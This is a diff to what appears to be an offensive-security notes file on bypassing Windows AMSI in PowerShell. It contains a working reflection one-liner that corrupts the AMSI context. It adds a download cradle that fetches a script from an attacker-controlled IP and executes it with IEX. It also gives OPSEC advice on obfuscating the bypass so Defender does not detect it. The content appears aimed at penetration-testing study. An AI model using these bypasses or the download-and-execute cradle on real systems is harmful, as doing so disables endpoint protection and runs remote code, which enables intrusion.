@@ -148,9 +148,14 @@ We can now enter any malicious command:
 PS C:\> amsiutils
 ```
 
-- Onliner:
+- Onliner (recommended):
 ```powershell
 PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
+- We can execute it directly on each PSH session or we can save the one liner in a PowerShell script called `amsi.txt` and use a download cradle to download and execute it:
+```powershell
+PS C:\> (new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
 ```
 
 **Option 2**
@@ -189,9 +194,6 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b
 
 > [!Warning]
 > OPSEC: Both the `amsiContext` and `amsiInitFailed` patches are well-known and signatured. Microsoft Defender (2023+) monitors for reflection calls on `AmsiUtils` fields. Obfuscate field name searches (e.g., use `"*nitFail*"` or split the string) and consider using the binary-patching approach from [[Wrecking AMSI in PowerShell]] as an alternative.
-
----
-# Wrecking AMSI in PowerShell
 
 ---
 # Related Notes
